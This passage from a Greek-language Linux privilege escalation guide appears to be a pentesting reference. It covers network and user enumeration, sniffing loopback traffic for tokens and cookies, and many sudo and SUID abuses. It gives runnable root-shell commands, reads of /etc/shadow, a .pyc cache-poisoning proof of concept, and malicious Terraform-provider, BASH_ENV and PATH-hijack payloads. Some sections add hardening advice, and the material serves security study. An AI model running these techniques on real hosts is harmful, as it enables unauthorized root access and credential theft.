sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Αν μια ενεργή εγγραφή στο `/etc/inetd.conf` εκτελεί το GNU Inetutils `telnetd` ως root, ελέγξτε την έκδοση του ρυθμισμένου binary και τον τοπικό listener, ακόμη κι αν η θύρα είναι δεσμευμένη μόνο στο loopback. Το GNU Inetutils από την έκδοση 1.9.3 έως και την 2.7 είχε ένα [bypass ελέγχου ταυτότητας στο telnet](https://seclists.org/oss-sec/2026/q1/89), μέσω του οποίου η τιμή `USER` που παρείχε ο client περνούσε στο `login -f` (CVE-2026-24061). Μια διεργασία ή μια συμβολοσειρά έκδοσης αποτελεί ένδειξη· επιβεβαιώστε την κατάσταση των vendor patches και ποιος daemon εκτελείται πραγματικά προτού θεωρήσετε ότι είναι εκτεθειμένος. Ο [οδηγός Telnet](../../../network-services-pentesting/pentesting-telnet.md) περιέχει περισσότερες λεπτομέρειες.

### Γρήγορος έλεγχος διαλογής για φιλτράρισμα εξερχόμενης κίνησης

Αν ο host μπορεί να εκτελέσει εντολές, αλλά αποτυγχάνουν οι callbacks, ελέγξτε γρήγορα ξεχωριστά το φιλτράρισμα DNS, μεταφοράς, proxy και δρομολόγησης:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Ανοιχτές θύρες

Ελέγχετε πάντα τις υπηρεσίες δικτύου που εκτελούνται στο μηχάνημα, με τις οποίες δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτό:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Ταξινομήστε τους listeners ανάλογα με τη διεύθυνση bind:

- `0.0.0.0` / `[::]`: εκτίθενται σε όλες τις τοπικές διεπαφές.
- `127.0.0.1` / `::1`: προσβάσιμοι μόνο τοπικά (καλοί υποψήφιοι για tunnel/forward).
- Συγκεκριμένες εσωτερικές IP (π.χ. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): συνήθως προσβάσιμες μόνο από εσωτερικά segments.

### Ροή εργασίας για την αρχική αξιολόγηση υπηρεσιών που είναι προσβάσιμες μόνο τοπικά

Όταν αποκτήσετε πρόσβαση σε έναν host, οι υπηρεσίες που είναι δεσμευμένες στη `127.0.0.1` συχνά γίνονται για πρώτη φορά προσβάσιμες από το shell σας. Μια γρήγορη τοπική ροή εργασίας είναι:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### Το LinPEAS ως σαρωτής δικτύου (λειτουργία μόνο δικτύου)

Εκτός από τους τοπικούς ελέγχους PE, το linPEAS μπορεί να εκτελεστεί ως εξειδικευμένος σαρωτής δικτύου. Χρησιμοποιεί τα διαθέσιμα binaries στο `$PATH` (συνήθως `fping`, `ping`, `nc`, `ncat`) και δεν εγκαθιστά εργαλεία.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Αν περάσετε τα `-d`, `-p` ή `-i` χωρίς το `-t`, το linPEAS λειτουργεί ως καθαρός network scanner (παραλείποντας τους υπόλοιπους ελέγχους privilege escalation).

### Sniffing

Ελέγξτε αν μπορείτε να κάνετε sniffing της κίνησης δικτύου. Αν μπορείτε, ίσως να καταφέρετε να υποκλέψετε credentials.

```
timeout 1 tcpdump
```

Γρήγοροι πρακτικοί έλεγχοι:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Το Loopback (`lo`) είναι ιδιαίτερα πολύτιμο στο post-exploitation, επειδή πολλές υπηρεσίες που είναι προσβάσιμες μόνο εσωτερικά εκθέτουν εκεί tokens/cookies/credentials:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Καταγράψτε τώρα, αναλύστε αργότερα:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Χρήστες

### Generic Enumeration

Ελέγξτε **ποιος** είστε, ποια **προνόμια** έχετε, ποιοι **χρήστες** υπάρχουν στα συστήματα, ποιοι μπορούν να κάνουν **login** και ποιοι έχουν **προνόμια root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Μεγάλο UID

Ορισμένες εκδόσεις Linux επηρεάζονταν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να κλιμακώσουν τα προνόμιά τους. Περισσότερες πληροφορίες: [εδώ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [εδώ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [εδώ](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit it** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας δώσει δικαιώματα root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατό)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Πολιτική κωδικών πρόσβασης

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Known passwords

Αν **γνωρίζετε κάποιον κωδικό πρόσβασης** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον.

### Su Brute

Αν δεν σας πειράζει να δημιουργήσετε πολύ θόρυβο και υπάρχουν τα binaries `su` και `timeout` στον υπολογιστή, μπορείτε να δοκιμάσετε να κάνετε brute-force σε χρήστες χρησιμοποιώντας το [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
Το [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` δοκιμάζει επίσης να κάνει brute-force σε χρήστες.

## Κατάχρηση εγγράψιμων PATH

### $PATH

Αν διαπιστώσετε ότι μπορείτε να **γράψετε σε κάποιον φάκελο του $PATH**, ίσως μπορέσετε να κλιμακώσετε τα προνόμιά σας **δημιουργώντας ένα backdoor μέσα στον εγγράψιμο φάκελο**, με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά τον root) και η οποία **δεν φορτώνεται από φάκελο που βρίσκεται πριν από τον εγγράψιμο φάκελό σας στο $PATH**.

### SUDO και SUID

Ίσως σας επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας το sudo ή αυτή μπορεί να έχει το bit suid. Ελέγξτε το με:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Ορισμένες **απρόσμενες εντολές σάς επιτρέπουν να διαβάζετε ή/και να γράφετε αρχεία, ή ακόμα και να εκτελείτε μια εντολή**.<sup>[[8]](#references)</sup> Για παράδειγμα:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Η ρύθμιση του Sudo μπορεί να επιτρέπει σε έναν χρήστη να εκτελεί ορισμένες εντολές με τα δικαιώματα ενός άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Σε αυτό το παράδειγμα, ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`. Τώρα είναι πανεύκολο να αποκτήσει shell προσθέτοντας ένα ssh key στον κατάλογο root ή καλώντας το `sh`.

```
sudo vim -c '!sh'
```

### Σύγκριση Bash χωρίς εισαγωγικά σε sudo script

Στο Bash, η δεξιά πλευρά του `[[ "$protected" == $candidate ]]` είναι ένα pattern. Αν ένα sudo script με δυνατότητα εκτέλεσης ως root συμπληρώνει το `candidate` από αρχείο που ελέγχει ο caller, μια τιμή όπως `prefix*` μπορεί να ταιριάξει με την αρχή μιας προστατευμένης συμβολοσειράς. Διαφορετικές διαδρομές επιτυχίας και σφάλματος ενδέχεται τότε να αποκαλύψουν ένα prefix oracle. Βάλτε τη δεξιά πλευρά σε εισαγωγικά (`[[ "$protected" == "$candidate" ]]`) όταν επιδιώκεται κυριολεκτική ισότητα. Ελέγξτε τα πραγματικά ορίσματα του sudo, την προέλευση της εισόδου και τη συμπεριφορά των παρατηρήσιμων κλάδων πριν θεωρήσετε ότι μια σύγκριση χωρίς εισαγωγικά είναι εκμεταλλεύσιμη. Το [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) ορίζει αυτή τη συμπεριφορά των pattern.

### Αρχεία project PrusaSlicer μέσω sudo

Μια απεριόριστη παραχώρηση sudo με δυνατότητα εκτέλεσης ως root για το `prusaslicer` ή το `prusa-slicer` χρήζει ελέγχου, αν ο caller μπορεί να επιλέξει το project `.3mf` που θα γίνει slice. Ένα project μπορεί να περιέχει script post-processing που εκτελείται κατά την εξαγωγή G-code· κατάλληλα διαμορφωμένα projects θα μπορούσαν να εκτελέσουν εντολές μέσω του PrusaSlicer έως και την έκδοση 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Επιβεβαιώστε τον ενεργό κανόνα sudo, την έκδοση του binary και τα vendor patches, την προέλευση του project και αν εκτελείται η σχετική διαδρομή εξαγωγής, πριν καταλήξετε ότι είναι προσβάσιμη η γραμμή ορίου προνομίων. Ένα σταθερό όρισμα project ή μια ενεργή πολιτική `NOEXEC` μπορεί να αλλάξει το αποτέλεσμα. Το να διαπιστώσετε απλώς ότι είναι εγκατεστημένο το slicer δεν αποδεικνύει ότι υπάρχει διαδρομή κλιμάκωσης προνομίων.

### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάποιου προγράμματος:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Αυτό το παράδειγμα, **βασισμένο στο μηχάνημα Admirer του HTB**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking**, επιτρέποντας τη φόρτωση μιας αυθαίρετης βιβλιοθήκης Python κατά την εκτέλεση του script ως root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Δηλητηρίαση εγγράψιμου `__pycache__` / `.pyc` σε Python imports που επιτρέπονται μέσω sudo

Αν ένα **Python script που επιτρέπεται μέσω sudo** εισάγει ένα module του οποίου ο κατάλογος πακέτου περιέχει εγγράψιμο **`__pycache__`**, ίσως μπορέσετε να αντικαταστήσετε το cached `.pyc` και να εκτελέσετε κώδικα ως προνομιούχος χρήστης στην επόμενη εισαγωγή.<sup>[[30]](#references)</sup>

- Γιατί λειτουργεί:
  - Το CPython αποθηκεύει τα bytecode caches στο `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Ο interpreter επικυρώνει την **κεφαλίδα** (magic + μεταδεδομένα timestamp/hash που συνδέονται με την πηγή) και έπειτα εκτελεί το marshaled code object που είναι αποθηκευμένο μετά από αυτήν.
  - Αν μπορείτε να **διαγράψετε και να δημιουργήσετε ξανά** το cached αρχείο επειδή ο κατάλογος είναι εγγράψιμος, μπορείτε να αντικαταστήσετε ένα `.pyc` που ανήκει στον root αλλά δεν είναι εγγράψιμο.
- Συνήθης διαδρομή:
  - Το `sudo -l` εμφανίζει ένα Python script ή wrapper που μπορείτε να εκτελέσετε ως root.
  - Αυτό το script εισάγει ένα τοπικό module από το `/opt/app/`, το `/usr/local/lib/...` κ.λπ.
  - Ο κατάλογος `__pycache__` του εισαγόμενου module είναι εγγράψιμος από τον χρήστη σας ή από όλους.

Γρήγορη απαρίθμηση:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Αν μπορείς να επιθεωρήσεις το προνομιούχο script, εντόπισε τα εισαγόμενα modules και τη διαδρομή της cache:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Ροή κατάχρησης:

1. Εκτελέστε μία φορά το script που επιτρέπεται μέσω sudo, ώστε η Python να δημιουργήσει το νόμιμο αρχείο cache, αν δεν υπάρχει ήδη.
2. Διαβάστε τα πρώτα 16 byte από το νόμιμο `.pyc` και χρησιμοποιήστε τα στο παραποιημένο αρχείο.
3. Μεταγλωττίστε ένα αντικείμενο κώδικα payload, εκτελέστε `marshal.dumps(...)`, διαγράψτε το αρχικό αρχείο cache και δημιουργήστε το ξανά με την αρχική επικεφαλίδα και τον κακόβουλο bytecode.
4. Εκτελέστε ξανά το script που επιτρέπεται μέσω sudo, ώστε η εισαγωγή να εκτελέσει το payload ως root.

Σημαντικές σημειώσεις:

- Η επαναχρησιμοποίηση της αρχικής επικεφαλίδας είναι σημαντική, επειδή η Python ελέγχει τα μεταδεδομένα της cache σε σχέση με το αρχείο πηγαίου κώδικα, όχι αν το σώμα του bytecode αντιστοιχεί πραγματικά στην πηγή.
- Αυτό είναι ιδιαίτερα χρήσιμο όταν το αρχείο πηγαίου κώδικα ανήκει στον root και δεν είναι εγγράψιμο, αλλά ο κατάλογος `__pycache__` που το περιέχει είναι εγγράψιμος.
- Τα `PYTHONDONTWRITEBYTECODE=1` και `python -B` εμποδίζουν την Python να γράφει νέα αρχεία `.pyc`· **δεν** την εμποδίζουν να φορτώσει μια ήδη έγκυρη cache που έχει αντικατασταθεί από επιτιθέμενο. Το κρίσιμο όριο είναι αν ένας χρήστης με χαμηλότερα δικαιώματα μπορεί να αντικαταστήσει μια cache που η προνομιακή εισαγωγή θα αποδεχτεί. Η Python ελέγχει τα μεταδεδομένα χρονικής σήμανσης/μεγέθους ή hash πριν φορτώσει τον αποθηκευμένο bytecode. Δείτε την [αναφορά εισαγωγών της Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) και την [τεκμηρίωση γραμμής εντολών](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Ελάχιστη μορφή proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Βεβαιωθείτε ότι κανένας κατάλογος στη διαδρομή εισαγωγής της προνομιούχας Python δεν είναι εγγράψιμος από χρήστες με χαμηλά προνόμια, συμπεριλαμβανομένου του `__pycache__`.
- Ελέγξτε την ιδιοκτησία και τα δικαιώματα των καταλόγων cache, συμπεριλαμβανομένων των υπαρχόντων αρχείων `.pyc`. Η απενεργοποίηση της εγγραφής bytecode μπορεί να περιορίσει τη δημιουργία νέων cache, αλλά δεν εξουδετερώνει μια υπάρχουσα cache που μπορεί να αντικατασταθεί.
- Αντιμετωπίζετε τα εγγράψιμα τοπικά modules Python και τους εγγράψιμους καταλόγους cache όπως θα αντιμετωπίζατε εγγράψιμα shell scripts ή shared libraries που εκτελούνται από τον root.

### Το BASH_ENV διατηρείται μέσω sudo env_keep → root shell

Αν το sudoers διατηρεί το `BASH_ENV` (π.χ., `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να αξιοποιήσετε τη συμπεριφορά εκκίνησης του Bash για μη διαδραστικές διεργασίες, ώστε να εκτελέσετε αυθαίρετο κώδικα ως root κατά την κλήση μιας επιτρεπόμενης εντολής.<sup>[[24]](#references)</sup>

- Γιατί λειτουργεί: Στα μη διαδραστικά shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source αυτό το αρχείο πριν εκτελέσει το script-στόχο. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Αν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνεται source με δικαιώματα root.<sup>[[23]](#references)</sup>

- Απαιτήσεις:
  - Ένας κανόνας sudo που μπορείτε να εκτελέσετε (οποιοσδήποτε στόχος που καλεί το `/bin/bash` σε μη διαδραστική λειτουργία ή οποιοδήποτε bash script).
  - Το `BASH_ENV` να υπάρχει στο `env_keep` (ελέγξτε το με `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - Αφαιρέστε τα `BASH_ENV` (και `ENV`) από το `env_keep` και προτιμήστε το `env_reset`.
  - Αποφύγετε shell wrappers για εντολές που επιτρέπονται μέσω sudo· χρησιμοποιήστε minimal binaries.
  - Εξετάστε την καταγραφή I/O του sudo και την αποστολή ειδοποιήσεων όταν χρησιμοποιούνται διατηρημένες μεταβλητές περιβάλλοντος.

### Terraform μέσω sudo με διατηρημένο HOME (!env_reset)

Όταν το sudo επιτρέπει την εκτέλεση του Terraform ως χρήστης με περισσότερα προνόμια, το `!env_reset` αποτελεί ένδειξη για να ελέγξετε ποιες μεταβλητές περιβάλλοντος διατηρούνται πράγματι από τον συγκεκριμένο κανόνα. Επιβεβαιώστε την ενεργή τιμή του `HOME` ή του `TF_CLI_CONFIG_FILE` πριν θεωρήσετε ότι ένα `.terraformrc` ή `terraform.rc` εγγράψιμο από τον καλούντα είναι η ενεργή ρύθμιση του CLI. Μια καταχώριση `provider_installation.dev_overrides` έχει σημασία μόνο αν η σταθερή εντολή Terraform φορτώνει αυτόν τον provider και ο καλών μπορεί να τοποθετήσει το εκτελέσιμό του στον επιλεγμένο κατάλογο.<sup>[[25]](#references)</sup>

- Κατευθύνετε τον απαιτούμενο provider σε έναν εγγράψιμο κατάλογο και τοποθετήστε ένα κακόβουλο plugin με όνομα ίδιο με αυτό του provider (π.χ., `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Το Terraform θα αποτύχει στη χειραψία του Go plugin, αλλά θα εκτελέσει το payload ως root πριν τερματιστεί, αφήνοντας πίσω ένα SUID shell.

### Υπερκαλύψεις TF_VAR + παράκαμψη επικύρωσης symlink

Οι μεταβλητές Terraform μπορούν να οριστούν μέσω μεταβλητών περιβάλλοντος `TF_VAR_<name>`, εφόσον ο συγκεκριμένος κανόνας sudo τις διατηρεί. Για ανάγνωση μέσω symlink πηγής απαιτείται επίσης ένας provider που ακολουθεί τον σύνδεσμο και αντιγράφει το προστατευμένο αποτέλεσμα σε προορισμό αναγνώσιμο από τον καλούντα. Για εγγραφή μέσω symlink προορισμού απαιτούνται ξεχωριστά μια καταχώριση προορισμού ελεγχόμενη από τον καλούντα και ένας προνομιούχος provider που την ακολουθεί κατά την εγγραφή· μια μεταγενέστερη προγραμματισμένη εργασία είναι μόνο μία πιθανή συνέπεια. Πριν δοκιμάσετε οποιαδήποτε από τις δύο διαδρομές, εξετάστε την ακριβή παραχώρηση sudo, τα σχετικά αρχεία `.tf`, την επιλεγμένη ρύθμιση CLI και την ιδιοκτησία των διαδρομών με εντολές μόνο για ανάγνωση, όπως `sudo -l`, `stat` και `readlink`. Ασθενείς λεξικές επικυρώσεις όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` δεν επιλύουν τα symlink:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Το Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε έναν προορισμό αναγνώσιμο από τον attacker. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για **εγγραφή** σε προνομιακές διαδρομές, δημιουργώντας εκ των προτέρων symlinks προορισμού (π.χ. δείχνοντας τη διαδρομή προορισμού του provider μέσα στο `/etc/cron.d/`).

### requiretty / !requiretty

Σε ορισμένες παλαιότερες διανομές, το sudo μπορεί να ρυθμιστεί με `requiretty`, το οποίο αναγκάζει το sudo να εκτελείται μόνο από διαδραστικό TTY. Αν έχει οριστεί το `!requiretty` (ή αν η επιλογή απουσιάζει), το sudo μπορεί να εκτελεστεί από μη διαδραστικά περιβάλλοντα, όπως reverse shells, cron jobs ή scripts.

```bash
Defaults !requiretty
```

Αυτό δεν αποτελεί από μόνο του άμεση ευπάθεια, αλλά διευρύνει τις περιπτώσεις στις οποίες μπορούν να γίνει κατάχρηση κανόνων sudo χωρίς να απαιτείται πλήρες PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Αν το `sudo -l` εμφανίζει `env_keep+=PATH` ή ένα `secure_path` που περιλαμβάνει καταχωρίσεις εγγράψιμες από τον επιτιθέμενο (π.χ., `/home/<user>/bin`), μια εξωτερική εντολή χωρίς πλήρη διαδρομή μέσα στον επιτρεπόμενο από το sudo στόχο μπορεί να υποκατασταθεί.<sup>[[3]](#references)</sup> Αξίζει επίσης να ελεγχθεί η απουσία ενεργού `secure_path`, **αν** το περιβάλλον sudo της εντολής διατηρεί ένα `PATH` που ελέγχεται από τον καλούντα· η απουσία από μόνη της δεν αποδεικνύει ότι ισχύει κάτι τέτοιο. Διαβάστε το επιτρεπόμενο script χωρίς να το εκτελέσετε και, στη συνέχεια, επαληθεύστε τον ακριβή κανόνα RunAs και ορισμάτων, τη διαδρομή αναζήτησης εντολών που χρησιμοποιείται και την ύπαρξη ενός εγγράψιμου και προσπελάσιμου καταλόγου που περιέχει το όνομα της εντολής και αναζητείται νωρίτερα. Ο έλεγχος ταυτότητας, το `NOEXEC`, τα ενσωματωμένα στοιχεία του shell και οι απόλυτες διαδρομές εντολών μπορούν να αλλάξουν το αποτέλεσμα.

- Απαιτήσεις: ένας κανόνας sudo (συχνά `NOPASSWD`) που εκτελεί ένα script/binary το οποίο καλεί εντολές χωρίς απόλυτες διαδρομές (`free`, `df`, `ps` κ.λπ.) και μια εγγράψιμη καταχώριση `PATH` που αναζητείται πρώτη.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Παράκαμψη διαδρομών κατά την εκτέλεση μέσω sudo
**Μεταβείτε** για να διαβάσετε άλλα αρχεία ή χρησιμοποιήστε **symlinks**. Για παράδειγμα, στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Αν χρησιμοποιείται **wildcard** (\*), είναι ακόμα πιο εύκολο:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Αντίμετρα**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Εντολή sudo/SUID binary χωρίς διαδρομή εντολής

Αν έχεις **δικαίωμα sudo** για μία μόνο εντολή **χωρίς να καθορίζεται η διαδρομή**: _hacker10 ALL= (root) less_, μπορείς να το εκμεταλλευτείς αλλάζοντας τη μεταβλητή PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί μια άλλη εντολή χωρίς να καθορίζει τη διαδρομή προς αυτήν (να ελέγχετε πάντα με** _**strings**_ **το περιεχόμενο ενός ύποπτου SUID binary)**.

[Παραδείγματα payload για εκτέλεση.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binary με διαδρομή εντολής

Αν το **suid** binary **εκτελεί μια άλλη εντολή καθορίζοντας τη διαδρομή**, τότε μπορείτε να δοκιμάσετε να **εξαγάγετε μια function** με όνομα ίδιο με αυτό της εντολής που καλεί το αρχείο suid.

Για παράδειγμα, αν ένα suid binary καλεί το _**/usr/sbin/service apache2 start**_, πρέπει να δοκιμάσετε να δημιουργήσετε και να εξαγάγετε τη function:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Έπειτα, όταν καλέσετε το SUID binary, θα εκτελεστεί αυτή η συνάρτηση

### Προσαρμοσμένα SUID wrappers αντιγραφής

Ένα βοηθητικό πρόγραμμα SUID που ανήκει στον root και δέχεται διαδρομές προέλευσης και προορισμού μπορεί να διασχίσει δύο διαφορετικά όρια εμπιστοσύνης. Αν δημιουργεί μια εντολή shell από κάποιο από τα ορίσματα (για παράδειγμα, αν περάσει μια κατασκευασμένη εντολή `cp` στο `system()`), οι μεταχαρακτήρες του shell ενδέχεται να εκτελέσουν άλλη εντολή με τα αποτελεσματικά δικαιώματά του. Ακόμα κι αν καλεί με ασφάλεια το `cp` χωρίς shell, ένας μη περιορισμένος προορισμός μπορεί να επιτρέψει αυθαίρετη εγγραφή με προνόμια σε αρχεία όπως το `/etc/passwd`. Ελέγξτε τον χειρισμό των ορισμάτων από το wrapper, τη συμπεριφορά του effective UID, τους περιορισμούς προορισμού και το αν το αρχείο που αντιγράφεται διατηρεί περιεχόμενο που ελέγχεται από τον καλούντα. Ένα γενικό σφάλμα `cp` ή το bit SUID από μόνο του δεν αποδεικνύει κανένα από τα δύο ενδεχόμενα. Καταγράψτε παθητικά το binary και τα δικαιώματά του πριν από οποιαδήποτε μη αυτόματη δοκιμή.

### Εγγράψιμο script που εκτελείται από SUID wrapper

Μια συνηθισμένη εσφαλμένη ρύθμιση σε προσαρμοσμένες εφαρμογές είναι ένα SUID binary wrapper που ανήκει στον root και εκτελεί ένα script, ενώ το ίδιο το script είναι εγγράψιμο από χρήστες με χαμηλά προνόμια.

Τυπικό μοτίβο:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Αν το `/usr/local/bin/backup.sh` είναι εγγράψιμο, μπορείτε να προσθέσετε εντολές payload και στη συνέχεια να εκτελέσετε το SUID wrapper:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

